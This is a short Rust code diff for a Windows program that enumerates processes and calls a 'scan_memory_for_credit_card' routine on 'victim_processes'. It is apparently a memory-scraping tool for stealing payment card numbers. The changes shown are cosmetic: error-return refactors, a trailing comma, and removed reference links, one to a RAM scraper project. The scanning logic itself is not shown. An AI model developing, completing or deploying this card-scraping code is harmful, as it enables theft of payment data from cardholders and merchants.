@@ -45,7 +45,8 @@ impl Process {
         if unsafe {
             EnumProcessModules(self.handle, module.as_mut_ptr(), module_size, &mut size)
         } == FALSE {
-            return eprintln!("{}", io::Error::last_os_error());
+            eprintln!("{}", io::Error::last_os_error());
+            return
         }
         
 
@@ -60,7 +61,8 @@ impl Process {
         };
 
         if length == 0 {
-            return println!("{}", io::Error::last_os_error())
+            println!("{}", io::Error::last_os_error());
+            return
         }
 
         unsafe {
@@ -133,12 +135,6 @@ pub fn enumerate_processes() -> io::Result<Vec<u32>> {
     Ok(pids)
 }
 
-// https://lonami.dev/blog/woce-1/
-// https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/index.html
-// 7:23 https://www.youtube.com/watch?v=gOJWkM1YhsA
-// https://users.rust-lang.org/t/help-with-getmodulefilenameexa-lpbasename-parameter/112799
-// https://github.com/joren485/RamScraper/blob/master/Ramscraper.py
-// https://stackoverflow.com/questions/54573814/read-the-whole-process-memory-into-a-buffer-in-c
 #[cfg(target_os = "windows")]
 fn main() {
     let pids = enumerate_processes().unwrap();
@@ -168,7 +164,7 @@ fn main() {
         for proc in &victim_processes {
             match proc.scan_memory_for_credit_card() {
                 Ok(data) => println!("{:?}", data),
-                Err(e) => eprintln!("{}", e)
+                Err(e) => eprintln!("{}", e),
             }
         }
     }
